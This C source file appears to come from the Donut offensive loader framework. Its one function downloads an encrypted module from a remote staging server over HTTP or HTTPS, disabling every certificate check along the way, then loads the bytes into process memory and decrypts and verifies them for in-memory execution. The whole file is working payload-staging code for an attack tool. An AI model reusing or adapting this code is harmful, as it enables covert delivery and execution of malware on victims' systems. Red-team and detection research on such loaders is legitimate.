/**
  BSD 3-Clause License

  Copyright (c) 2019, TheWover, Odzhan. All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are met:

  * Redistributions of source code must retain the above copyright notice, this
    list of conditions and the following disclaimer.

  * Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

  * Neither the name of the copyright holder nor the names of its
    contributors may be used to endorse or promote products derived from
    this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

BOOL DownloadFromHTTP(PDONUT_INSTANCE inst) {
    HINTERNET       hin, con, req;
    PBYTE           inbuf=NULL;
    DWORD           chunklen, pos, res, inlen, s, n, rd, len, code=0;
    BOOL            bResult = FALSE, bSecure = FALSE, bIgnore = TRUE;
    URL_COMPONENTS  uc;
    CHAR            host[MAX_PATH], 
                    file[MAX_PATH],
                    username[64], password[64];
    SIZE_T          rs;
    NTSTATUS        status;
    
    // default flags for HTTP client
    DWORD flags = INTERNET_FLAG_KEEP_CONNECTION | 
                  INTERNET_FLAG_DONT_CACHE      | 
                  INTERNET_FLAG_NO_UI           |
                  INTERNET_FLAG_PRAGMA_NOCACHE  |
                  INTERNET_FLAG_NO_AUTO_REDIRECT;
    
    Memset(&uc, 0, sizeof(uc));
    
    uc.dwStructSize     = sizeof(uc);
    
    uc.lpszHostName     = host;
    uc.dwHostNameLength = sizeof(host);
    
    uc.lpszUrlPath      = file;
    uc.dwUrlPathLength  = sizeof(file);
    
    uc.lpszUserName     = username;
    uc.dwUserNameLength = sizeof(username);
    
    uc.lpszPassword     = password;
    uc.dwPasswordLength = sizeof(password);
    
    if(!inst->api.InternetCrackUrl(
      inst->server, 0, ICU_DECODE, &uc)) {
      DPRINT("InternetCrackUrl");
      return FALSE;
    }
    
    bSecure = (uc.nScheme == INTERNET_SCHEME_HTTPS);
    
    // if secure connection, update the flags
    if(bSecure) {
      flags |= INTERNET_FLAG_SECURE;
      // ignore invalid certificates?
      if(bIgnore) {
        flags |= INTERNET_FLAG_IGNORE_CERT_CN_INVALID   |
                 INTERNET_FLAG_IGNORE_CERT_DATE_INVALID; 
      }
    }
    
    hin = inst->api.InternetOpen(
      NULL, INTERNET_OPEN_TYPE_PRECONFIG, 
      NULL, NULL, 0);
    
    if(hin == NULL) return FALSE;

    DPRINT("Creating %s connection for %s", 
      bSecure ? "HTTPS" : "HTTP", host);
      
    con = inst->api.InternetConnect(
        hin, host, uc.nPort, NULL, NULL, 
        INTERNET_SERVICE_HTTP, 0, 0);
        
    if(con != NULL) {
      if(uc.dwUrlPathLength == 0) {
        file[0] = '/'; 
        file[1] = '\0';
      }
      DPRINT("Opening GET request for %s", file);

      req = inst->api.HttpOpenRequest(
              con, NULL, file, NULL, 
              NULL, NULL, flags, 0);
              
      if(req != NULL) {
        
        // see if we should ignore invalid certificates for this request
        if(bSecure) {
          if(flags & INTERNET_FLAG_IGNORE_CERT_CN_INVALID) {
            n = sizeof (s);
            
            s = SECURITY_FLAG_IGNORE_UNKNOWN_CA        |
                SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                SECURITY_FLAG_IGNORE_CERT_CN_INVALID   |
                SECURITY_FLAG_IGNORE_WRONG_USAGE       |
                SECURITY_FLAG_IGNORE_REVOCATION;
                
            DPRINT("Setting option to ignore invalid certificates");
          
            inst->api.InternetSetOption(
              req, 
              INTERNET_OPTION_SECURITY_FLAGS, 
              &s, 
              sizeof(s));
          }
        }
        // set username
        if(uc.dwUserNameLength != 0) {
          DPRINT("Using username : %s", uc.lpszUserName);
      
          bResult = inst->api.InternetSetOption(
            req, INTERNET_OPTION_USERNAME,
            uc.lpszUserName, uc.dwUserNameLength);

          if(!bResult) {
            DPRINT("Error with InternetSetOption(INTERNET_OPTION_USERNAME)");
          }
        }
        
        // set password
        if(uc.dwPasswordLength != 0) {
          DPRINT("Using password : %s", uc.lpszPassword);
          bResult = inst->api.InternetSetOption(
            req, INTERNET_OPTION_PASSWORD,
            uc.lpszPassword, uc.dwPasswordLength);

          if(!bResult) {
            DPRINT("Error with InternetSetOption(INTERNET_OPTION_PASSWORD)");
          }
        }
          
        DPRINT("Sending request");
        
        if(inst->api.HttpSendRequest(req, NULL, 0, NULL, 0)) {
          len  = sizeof(DWORD);
          code = 0;
          DPRINT("Querying status code");
          
          if(inst->api.HttpQueryInfo(
              req, 
              HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, 
              &code, &len, 0))
          {
            DPRINT("Code is %i", code);
            
            if(code == HTTP_STATUS_OK) {
              // try to query the content length
              len   = sizeof(SIZE_T);
              inlen = 0;
              
              res = inst->api.HttpQueryInfo(
                req, 
                HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, 
                &inlen, &len, 0);
              
              // if there's no content length
              if(!res) {
                DPRINT("Error reading content length.");
                if(inst->api.GetLastError() == ERROR_HTTP_HEADER_NOT_FOUND) {
                  DPRINT("Retrieving data in chunked mode.");
                  // perform a chunked read
                  for(inlen=0;;) {
                    // determine what's available
                    res = inst->api.InternetQueryDataAvailable(req, &chunklen, 0, 0);
                    
                    // if call fails or nothing to read, end loop
                    if(!res || chunklen == 0) {
                      break;
                    }
                    if(inbuf == NULL) {
                      // allocate buffer for chunk to be read
                      inbuf = inst->api.HeapAlloc(
                        inst->api.GetProcessHeap(), 
                        HEAP_NO_SERIALIZE, chunklen);
                      if(inbuf == NULL) {
                        DPRINT("HeapAlloc");
                        break;
                      }
                    } else {
                      // expand size of buffer
                      inbuf = inst->api.HeapReAlloc(
                        inst->api.GetProcessHeap(), 
                        HEAP_NO_SERIALIZE, 
                        inbuf, inlen + chunklen);
                      
                      if(inbuf == NULL) {
                        DPRINT("HeapReAlloc");
                        break;
                      }                      
                    }
                    // read chunk
                    res = inst->api.InternetReadFile(
                      req, inbuf+inlen, chunklen, &rd);
                      
                    inlen += chunklen;
                  }
                }
              } else {
                DPRINT("Retrieving %ld bytes of data in single read.", inlen);
                if(inlen != 0) {
                  inbuf = inst->api.HeapAlloc(
                    inst->api.GetProcessHeap(), 
                    HEAP_NO_SERIALIZE, inlen);
                    
                  if(inbuf != NULL) {
                    rd = 0;
                    DPRINT("Reading %i bytes...", inlen);
                    bResult = inst->api.InternetReadFile(
                      req, inbuf, inlen, &rd);
                  } else {
                    DPRINT("HeapAlloc");
                  }
                }
              }
            } else {
              DPRINT("HTTP response was %i", code);
            }
          } else {
            DPRINT("HttpQueryInfo");
          }
        } else {
          DPRINT("HttpSendRequest");
        }
       
        if(inbuf != NULL && inlen != 0) {
          DPRINT("Copying %i bytes to VM", inlen);
          rs = inlen;
          status = NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID)&inst->module.p, 0, &rs, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
          
          if(NT_SUCCESS(status)) {
            Memcpy(inst->module.p, inbuf, inlen);
            bResult = TRUE;
          } else {
            bResult = FALSE;
          }
          Memset(inbuf, 0, inlen);
          
          inst->api.HeapFree(
            inst->api.GetProcessHeap(), 
            HEAP_NO_SERIALIZE, inbuf);
        }
        DPRINT("Closing request");
        inst->api.InternetCloseHandle(req);
      }
      DPRINT("Closing connection handle");
      inst->api.InternetCloseHandle(con);
    }
    DPRINT("Closing internet handle");
    inst->api.InternetCloseHandle(hin);
       
    if(bResult && inst->entropy == DONUT_ENTROPY_DEFAULT) {
      PDONUT_MODULE mod = inst->module.p;
      
      DPRINT("Decrypting %lli bytes of module", inst->mod_len);
    
      donut_decrypt(inst->mod_key.mk, 
              inst->mod_key.ctr,
              mod, 
              inst->mod_len);
            
      DPRINT("Generating hash to verify decryption");
      ULONG64 mac = maru(inst->sig, inst->iv);
      
      DPRINT("Module : %016llx | Result : %016llx", mod->mac, mac);
      
      if(mac != mod->mac) {
        DPRINT("Decryption failed");
        return FALSE;
      }
    }
    return bResult;
}
